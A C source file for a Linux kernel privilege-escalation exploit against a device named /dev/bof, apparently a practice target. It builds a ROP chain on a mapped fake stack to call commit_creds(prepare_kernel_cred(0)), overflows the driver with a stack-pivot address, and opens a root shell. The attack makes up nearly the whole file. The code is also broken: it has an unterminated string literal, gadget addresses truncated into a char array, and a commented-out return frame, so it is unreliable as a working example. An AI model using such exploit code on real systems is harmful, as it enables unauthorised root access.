#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
// 0xc1709193 : add al, ch ; pop edi ; ret
// 0xc129b6ca : clc ; pop edi ; ret
struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
// ./e c1070e80 c10711f0
void exploit(){
    char* fake_stack = (char*)mmap(0xc9ffd24a - 0x1000, 0x2000, 
        PROT_READ|PROT_WRITE|PROT_EXEC, 
        MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 
        -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0x0; // dummy r12
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = 0xc10c664d; // pop edi ; ret
    fake_stack[off++] = 0x0; // rdi <- 0
    fake_stack[off++] = prepare_kernel_cred; // eax = prepare_kernel_cred(0)
    fake_stack[off++] = 0xc1040c45; // pop ebx ; ret 
    fake_stack[off++] = 0xc1015ef7; // points to lone ret instruction to put in ebx
    fake_stack[off++] = 0xc1241438; // mov eax, edi ; call dword ptr [ebx]
    fake_stack[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
    fake_stack[off++] = 0x0; // dummy rbp
    // 0xc13fcd94 : add al, 0xe8 ; mov esp, 0xc9ffd24a ; ret
    // 0xc12b1c7e : add al, ch ; mov esp, 0xc9ffffef ; ret
    // 0xc133ca7e : add al, ch ; mov esp, 0xc9fffffe ; ret
    // 0xc152b99e : add eax, ebp ; mov esp, 0x89ffc3e1 ; ret
    fake_stack[off++] = 0xc1052be7+1; // 0f 48 cf cmovs %edi,%ecx (last 2 opcodes used for iretq) iretq frame
    // fake_stack[off++] = user_rip;
    // fake_stack[off++] = user_cs;
    // fake_stack[off++] = user_rflags;
    // fake_stack[off++] = user_sp;
    // fake_stack[off++] = user_ss;
    int fd = open("/dev/bof", O_RDWR);
	if (fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
    printf("all good);
    char* buf = (char*)calloc(44, sizeof(unsigned long));
    //0xc13fcd94
    buf[40] = '\x94';
    buf[41] = '\xcd';
    buf[42] = '\x3f';
    buf[43] = '\xc1';
    write(fd, buf, 44);
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, esp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

int main(int argc, char** argv) {
    if(argc!=3) {
	    printf("Usage: %s commit_creds prepare_kernel_cred\n", argv[0]);
    	exit(-1);
	}
    sscanf(argv[1], "%lx", &commit_creds);
    sscanf(argv[2], "%lx", &prepare_kernel_cred);
    save_state();
    exploit();
    puts("[!] Should never be reached");
    return 0;
}
